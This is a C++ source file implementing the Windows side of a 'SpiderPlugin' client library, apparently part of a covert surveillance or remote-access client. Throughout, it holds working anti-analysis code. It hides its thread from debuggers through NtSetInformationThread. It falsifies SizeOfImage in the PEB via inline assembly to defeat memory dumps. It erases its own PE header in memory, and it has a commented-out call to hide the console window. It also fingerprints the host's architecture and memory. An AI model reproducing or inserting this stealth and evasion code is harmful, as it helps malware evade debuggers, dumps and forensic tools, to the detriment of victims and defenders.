#if defined _WIN32

#include <windows.h>
#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <cstdint>
#include "SpiderPlugin.h"

namespace spider
{
namespace client
{
namespace library
{
bool SpiderPlugin::initWindows()
{
	// Hide window
	// TODO: Un-comment
	//::ShowWindow(::GetConsoleWindow(), SW_HIDE);

	// Check if already loaded
	HANDLE hMutex = CreateMutex(NULL, FALSE, "winSp1d3r");
	if (hMutex && GetLastError() != 0)
	{
		return false;
	}

	// Hide current thread
	hideThreadWindows(GetCurrentThread());

	// Change image size, preventing from memory dump
	std::uint32_t NewSize = (std::rand() & 0x7777) + 0x100000;
	__asm {
		mov eax, fs:[0x30] // PEB
		nop
		mov eax, [eax + 0x0c] // PEB_LDR_DATA
		nop
		nop
		mov eax, [eax + 0x0c] // InOrderModuleList
		nop
		mov ecx, NewSize
		mov dword ptr[eax + 0x20], ecx // SizeOfImage
		nop
	}

	// Remove PE header
	DWORD OldProtect = 0;

	// Get base address of module
	char *pBaseAddr = (char *)GetModuleHandle(NULL);
	// Change memory protection
	// Assume x86 page size
	VirtualProtect(pBaseAddr, 0x1000, PAGE_READWRITE, &OldProtect);
	// Erase the header
	std::memset(pBaseAddr, 0, 0x1000);

	return true;
}

bool SpiderPlugin::hideThreadWindows(void *handleThread)
{

	typedef NTSTATUS(NTAPI * pNtSetInformationThread)(HANDLE, UINT, PVOID, ULONG);
	if (!handleThread)
	{
		return false;
	}
	// Get NtSetInformationThread
	pNtSetInformationThread NtSIT = reinterpret_cast<pNtSetInformationThread>(GetProcAddress(GetModuleHandle(TEXT("ntdll.dll")), "NtSetInformationThread"));

	// Shouldn't fail
	if (!NtSIT)
	{
		return false;
	}
	// 0x11 -> HideFromDebugger
	NTSTATUS Status = NtSIT(handleThread, 0x11, 0, 0);
	return !!Status;
}

bool SpiderPlugin::deinitWindows()
{
	system("pause");
	return false;
}

Architecture SpiderPlugin::detectArchWindows() const
{
	// Using WinAPI types
	int is64 = 0;

	// typedef for function prototype
	typedef BOOL(WINAPI * LPFN_ISWOW64PROCESS)(HANDLE, PBOOL);
	LPFN_ISWOW64PROCESS fnIsWow64Process = reinterpret_cast<LPFN_ISWOW64PROCESS>(GetProcAddress(
		GetModuleHandle(TEXT("kernel32")), "IsWow64Process"));

	if (fnIsWow64Process)
	{
		if (!fnIsWow64Process(GetCurrentProcess(), &is64))
		{
			return Architecture::BITS_UNKNOWN;
		}
	}
	return (is64) ? Architecture::BITS_64 : Architecture::BITS_32;
}

std::uint64_t SpiderPlugin::getRAMWindows() const
{
	typedef int(WINAPI * PGMSE)(LPMEMORYSTATUSEX);
	PGMSE pGMSE = reinterpret_cast<PGMSE>(GetProcAddress(GetModuleHandle(TEXT("kernel32.dll")), TEXT("GlobalMemoryStatusEx")));
	if (pGMSE)
	{
		MEMORYSTATUSEX mi;

		std::memset(&mi, 0, sizeof(MEMORYSTATUSEX));
		mi.dwLength = sizeof(MEMORYSTATUSEX);
		if (pGMSE(&mi) == TRUE)
		{
			return mi.ullTotalPhys / (1024ull * 1024ull);
		}
		pGMSE = 0;
	}
	MEMORYSTATUS mi;

	std::memset(&mi, 0, sizeof(MEMORYSTATUS));
	mi.dwLength = sizeof(MEMORYSTATUS);
	GlobalMemoryStatus(&mi);
	return mi.dwTotalPhys / (1024ull * 1024ull);
}

SystemInfos SpiderPlugin::getInfosWindows() const
{
	SystemInfos infos;

	infos.arch = detectArchWindows();
	infos.os = OperatingSystem::Windows;

	SYSTEM_INFO sysInfos;
	GetNativeSystemInfo(&sysInfos);

	// Fill processor architecture informations
	switch (sysInfos.wProcessorArchitecture)
	{
	case PROCESSOR_ARCHITECTURE_AMD64:
		infos.pArch = ProcArchitecture::AMD64;
		break;
	case PROCESSOR_ARCHITECTURE_ARM:
		infos.pArch = ProcArchitecture::ARM;
		break;
	case PROCESSOR_ARCHITECTURE_IA64:
		infos.pArch = ProcArchitecture::IntelItanium;
		break;
	case PROCESSOR_ARCHITECTURE_INTEL:
		infos.pArch = ProcArchitecture::x86;
		break;
	default:
		infos.pArch = ProcArchitecture::Unknown;
		break;
	}

	infos.pageSize = sysInfos.dwPageSize;
	infos.nbProc = sysInfos.dwNumberOfProcessors;
	infos.ram = getRAMWindows();

	return infos;
}
}
}
}
#endif